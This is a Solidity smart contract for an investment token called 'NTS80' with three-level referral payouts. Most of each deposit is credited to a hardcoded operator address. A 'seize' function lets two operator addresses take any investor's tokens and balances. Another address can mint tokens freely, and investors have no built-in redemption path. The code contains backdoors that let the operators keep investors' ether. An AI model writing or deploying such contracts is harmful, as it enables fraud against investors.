1 pragma solidity 0.5.11;
2 
3 
4 interface ICustomersFundable {
5     function fundCustomer(address customerAddress, uint8 subconto) external payable;
6 }
7 
8 interface IRemoteWallet {
9     function invest(address customerAddress, address target, uint256 value, uint8 subconto) external returns (bool);
10 }
11 
12 interface IFundable {
13     function fund() external payable;
14 }
15 
16 contract NTS80 is IFundable {
17     modifier onlyBagholders {
18         require(myTokens() > 0);
19         _;
20     }
21 
22     modifier onlyAdmin {
23         require(msg.sender == admin);
24         _;
25     }
26 
27     modifier onlyBoss2 {
28         require(msg.sender == boss2);
29         _;
30     }
31     
32     modifier onlyBoss3 {
33         require(msg.sender == boss3);
34         _;
35     }
36 
37     string public name = "NTS 80";
38     string public symbol = "NTS80";
39     uint8 constant public decimals = 18;
40     address public admin;
41     address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;
42     address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;
43     address public boss3 = 0xf4632894bF968467091Dec1373CC1Bf5d15ef6B1;
44     
45     uint8 public refLevel1_ = 9;
46     uint8 public refLevel2_ = 3;
47     uint8 public refLevel3_ = 2;
48     uint256 constant internal tokenPrice = 0.001 ether;
49     uint256 public minimalInvestment = 2.5 ether;
50     uint256 public stakingRequirement = 0;
51     
52     mapping(address => uint256) internal tokenBalanceLedger_;
53     mapping(address => uint256) public referralBalance_;
54     mapping(address => uint256) public repayBalance_;
55     mapping(address => bool) public mayPassRepay;
56 
57     uint256 internal tokenSupply_;
58     bool public saleOpen = true;
59     
60     address private refBase = address(0x0);
61 
62     constructor() public {
63         admin = msg.sender;
64         mayPassRepay[boss1] = true;
65         mayPassRepay[boss2] = true;
66         mayPassRepay[boss3] = true;
67     }
68 
69     function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
70         require(msg.value >= minimalInvestment, "Value is below minimal investment.");
71         require(saleOpen, "Sales stopped for the moment.");
72         return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
73     }
74 
75     function() external payable {
76         require(msg.value >= minimalInvestment, "Value is below minimal investment.");
77         require(saleOpen, "Sales stopped for the moment.");
78         purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));
79     }
80 
81     function reinvest() public {
82         address _customerAddress = msg.sender;
83         uint256 value = referralBalance_[_customerAddress];
84         require(value > 0);
85         
86         referralBalance_[_customerAddress] = 0;
87         uint256 _tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));
88         emit OnReinvestment(_customerAddress, value, _tokens, false, now);
89     }
90     
91     function remoteReinvest(uint256 value) public {
92         if (IRemoteWallet(refBase).invest(msg.sender, address(this), value, 4)) {
93             uint256 tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));
94             emit OnReinvestment(msg.sender, value, tokens, true, now);
95         }
96     }
97     
98     function fund() public payable {
99         emit OnFund(msg.sender, msg.value, now);
100     }
101 
102     function exit() public {
103         address _customerAddress = msg.sender;
104         uint256 balance = repayBalance_[_customerAddress];
105         if (balance > 0) getRepay();
106         withdraw();
107     }
108 
109     function withdraw() public {
110         address payable _customerAddress = msg.sender;
111         uint256 value = referralBalance_[_customerAddress];
112         require(value > 0);
113         referralBalance_[_customerAddress] = 0;
114         _customerAddress.transfer(value);
115         emit OnWithdraw(_customerAddress, value, now);
116     }
117 
118     function getRepay() public {
119         address payable _customerAddress = msg.sender;
120         uint256 balance = repayBalance_[_customerAddress];
121         require(balance > 0);
122         repayBalance_[_customerAddress] = 0;
123         uint256 tokens = tokenBalanceLedger_[_customerAddress];
124         tokenBalanceLedger_[_customerAddress] = 0;
125         tokenSupply_ = tokenSupply_ - tokens;
126 
127         _customerAddress.transfer(balance);
128         emit OnGotRepay(_customerAddress, balance, now);
129     }
130 
131     function myTokens() public view returns (uint256) {
132         address _customerAddress = msg.sender;
133         return balanceOf(_customerAddress);
134     }
135 
136     function balanceOf(address _customerAddress) public view returns (uint256) {
137         return tokenBalanceLedger_[_customerAddress];
138     }
139 
140     function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
141         address _customerAddress = msg.sender;
142         uint8 welcomeFee_ = refLevel1_ + refLevel2_ + refLevel3_;
143         require(welcomeFee_ <= 99);
144 
145         uint256[7] memory uIntValues = [
146             _incomingEthereum * welcomeFee_ / 100,
147             0,
148             0,
149             0,
150             0,
151             0,
152             0
153         ];
154 
155         uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;
156         uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;
157         uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;
158 
159         uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];
160 
161         uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
162         //uint256 _fee = _dividends * magnitude;
163 
164         require(_amountOfTokens > 0);
165 
166         if (
167             _ref1 != 0x0000000000000000000000000000000000000000 &&
168             tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement
169         ) {
170             if (refBase == address(0x0)) {
171                 referralBalance_[_ref1] += uIntValues[1];
172             } else {
173                 ICustomersFundable(refBase).fundCustomer.value(uIntValues[1])(_ref1, 1);
174                 uIntValues[4] = uIntValues[1]; 
175             }
176         } else {
177             referralBalance_[boss1] += uIntValues[1];
178             _ref1 = 0x0000000000000000000000000000000000000000;
179         }
180 
181         if (
182             _ref2 != 0x0000000000000000000000000000000000000000 &&
183             tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement
184         ) {
185             if (refBase == address(0x0)) {
186                 referralBalance_[_ref2] += uIntValues[2];
187             } else {
188                 ICustomersFundable(refBase).fundCustomer.value(uIntValues[2])(_ref2, 2);
189                 uIntValues[5] = uIntValues[2];
190             }
191         } else {
192             referralBalance_[boss1] += uIntValues[2];
193             _ref2 = 0x0000000000000000000000000000000000000000;
194         }
195 
196         if (
197             _ref3 != 0x0000000000000000000000000000000000000000 &&
198             tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement
199         ) {
200             if (refBase == address(0x0)) {
201                 referralBalance_[_ref3] += uIntValues[3];
202             } else {
203                 ICustomersFundable(refBase).fundCustomer.value(uIntValues[3])(_ref3, 3);
204                 uIntValues[6] = uIntValues[3];
205             }
206         } else {
207             referralBalance_[boss1] += uIntValues[3];
208             _ref3 = 0x0000000000000000000000000000000000000000;
209         }
210 
211         referralBalance_[boss2] += _taxedEthereum;
212 
213         tokenSupply_ += _amountOfTokens;
214         
215         tokenBalanceLedger_[_customerAddress] += _amountOfTokens;
216 
217         emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, uIntValues[4], uIntValues[5], uIntValues[6], now);
218 
219         return _amountOfTokens;
220     }
221 
222     function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {
223         uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;
224 
225         return _tokensReceived;
226     }
227 
228     function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {
229         uint256 _etherReceived = _tokens / tokenPrice * 1e18;
230 
231         return _etherReceived;
232     }
233 
234     /* Admin methods */
235     function mint(address customerAddress, uint256 value) public onlyBoss3 {
236         tokenSupply_ += value;
237         tokenBalanceLedger_[customerAddress] += value;
238         
239         emit OnMint(customerAddress, value, now);
240     }
241     
242     function setRefBonus(uint8 level1, uint8 level2, uint8 level3, uint256 minInvest, uint256 staking) public {
243         require(msg.sender == boss3 || msg.sender == admin);
244         refLevel1_ = level1;
245         refLevel2_ = level2;
246         refLevel3_ = level3;
247         
248         minimalInvestment = minInvest;
249         stakingRequirement = staking;
250         
251         emit OnRefBonusSet(level1, level2, level3, minInvest, staking, now);
252     }
253     
254     function passRepay(address customerAddress) public payable {
255         require(mayPassRepay[msg.sender], "Not allowed to pass repay from your address.");
256         uint256 value = msg.value;
257         require(value > 0);
258 
259         repayBalance_[customerAddress] += value;
260         emit OnRepayPassed(customerAddress, msg.sender, value, now);
261     }
262 
263     function allowPassRepay(address payer) public onlyAdmin {
264         mayPassRepay[payer] = true;
265         emit OnRepayAddressAdded(payer, now);
266     }
267 
268     function denyPassRepay(address payer) public onlyAdmin {
269         mayPassRepay[payer] = false;
270         emit OnRepayAddressRemoved(payer, now);
271     }
272 
273     function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {
274         require(mayPassRepay[msg.sender], "Not allowed to pass interest from your address.");
275         require(msg.value > 0);
276         
277         if (refBase == address(0x0)) {
278             referralBalance_[customerAddress] += msg.value;
279         } else {
280             ICustomersFundable(refBase).fundCustomer.value(msg.value)(msg.sender, 5);
281         }
282 
283         emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);
284     }
285 
286     function saleStop() public onlyAdmin {
287         saleOpen = false;
288         emit OnSaleStop(now);
289     }
290 
291     function saleStart() public onlyAdmin {
292         saleOpen = true;
293         emit OnSaleStart(now);
294     }
295 
296     function deposeBoss3(address x) public onlyAdmin {
297         emit OnBoss3Deposed(boss3, x, now);
298         boss3 = x;
299     }
300     
301     function setRefBase(address x) public onlyAdmin {
302         emit OnRefBaseSet(refBase, x, now);
303         refBase = x;
304     }
305     
306     function seize(address customerAddress, address receiver) public {
307         require(msg.sender == boss1 || msg.sender == boss2);
308  
309         uint256 tokens = tokenBalanceLedger_[customerAddress];
310         if (tokens > 0) {
311             tokenBalanceLedger_[customerAddress] = 0;
312             tokenBalanceLedger_[receiver] += tokens;
313         }
314         
315         uint256 value = referralBalance_[customerAddress];
316         if (value > 0) {
317             referralBalance_[customerAddress] = 0;
318             referralBalance_[receiver] += value;
319         }
320         
321         uint256 repay = repayBalance_[customerAddress];
322         if (repay > 0) {
323             repayBalance_[customerAddress] = 0;
324             referralBalance_[receiver] += repay;
325         }
326         
327         emit OnSeize(customerAddress, receiver, tokens, value, repay, now);
328     }
329 
330     event OnTokenPurchase(
331         address indexed customerAddress,
332         uint256 incomingEthereum,
333         uint256 tokensMinted,
334         address ref1,
335         address ref2,
336         address ref3,
337         uint256 ref1value,
338         uint256 ref2value,
339         uint256 ref3value,
340         uint256 timestamp
341     );
342 
343     event OnReinvestment(
344         address indexed customerAddress,
345         uint256 ethereumReinvested,
346         uint256 tokensMinted,
347         bool isRemote,
348         uint256 timestamp
349     );
350 
351     event OnWithdraw(
352         address indexed customerAddress,
353         uint256 value,
354         uint256 timestamp
355     );
356 
357     event OnGotRepay(
358         address indexed customerAddress,
359         uint256 value,
360         uint256 timestamp
361     );
362 
363     event OnRepayPassed(
364         address indexed customerAddress,
365         address indexed payer,
366         uint256 value,
367         uint256 timestamp
368     );
369 
370     event OnInterestPassed(
371         address indexed customerAddress,
372         uint256 value,
373         uint256 ethRate,
374         uint256 rate,
375         uint256 timestamp
376     );
377 
378     event OnSaleStop(
379         uint256 timestamp
380     );
381 
382     event OnSaleStart(
383         uint256 timestamp
384     );
385 
386     event OnRepayAddressAdded(
387         address indexed payer,
388         uint256 timestamp
389     );
390 
391     event OnRepayAddressRemoved(
392         address indexed payer,
393         uint256 timestamp
394     );
395     
396     event OnMint(
397         address indexed customerAddress,
398         uint256 value,
399         uint256 timestamp
400     );
401     
402     event OnBoss3Deposed(
403         address indexed former,
404         address indexed current,
405         uint256 timestamp  
406     );
407     
408     event OnRefBonusSet(
409         uint8 level1,
410         uint8 level2,
411         uint8 level3,
412         uint256 minimalInvestment,
413         uint256 stakingRequirement,
414         uint256 timestamp
415     );
416     
417     event OnRefBaseSet(
418         address indexed former,
419         address indexed current,
420         uint256 timestamp
421     );
422     
423     event OnSeize(
424         address indexed customerAddress,
425         address indexed receiver,
426         uint256 tokens,
427         uint256 value,
428         uint256 repayValue,
429         uint256 timestamp
430     );
431     
432     event OnFund(
433         address indexed source,
434         uint256 value,
435         uint256 timestamp
436     );
437 }